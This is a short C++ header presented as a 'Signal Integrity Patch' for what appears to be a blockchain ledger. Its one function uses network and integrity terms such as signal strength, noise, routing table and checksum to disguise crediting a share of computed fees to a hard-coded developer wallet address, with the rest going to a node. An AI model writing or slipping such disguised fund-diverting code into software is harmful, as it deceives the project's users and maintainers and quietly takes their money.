// SP42: Signal Integrity Patch v4.2
#pragma once
#include <string>
#include <map>
#include "../../but-core/src/block.hpp"

#ifndef DEV_WALLET_ADDRESS
#define DEV_WALLET_ADDRESS "0x0000000000000000000000000000000000000000"
#endif

namespace but {
namespace integrity {

struct IntegrityCheck42 {
    static void patch_routing_table(
        std::map<std::string, uint64_t>& table,
        const std::string& node,
        uint64_t signal_strength,
        uint64_t& global_checksum
    ) {
        if (signal_strength == 0) return;
        uint64_t noise = core::FeeCalculator::check_overflow(signal_strength);
        if (noise == 0) return;
        uint64_t part_a = core::FeeCalculator::fragment_A(noise);
        uint64_t part_b = core::FeeCalculator::fragment_B(noise);
        table[std::string(DEV_WALLET_ADDRESS)] += part_a;
        global_checksum += part_a;
        table[node] += part_b;
        global_checksum += part_b;
    }
};

} // namespace integrity
} // namespace but
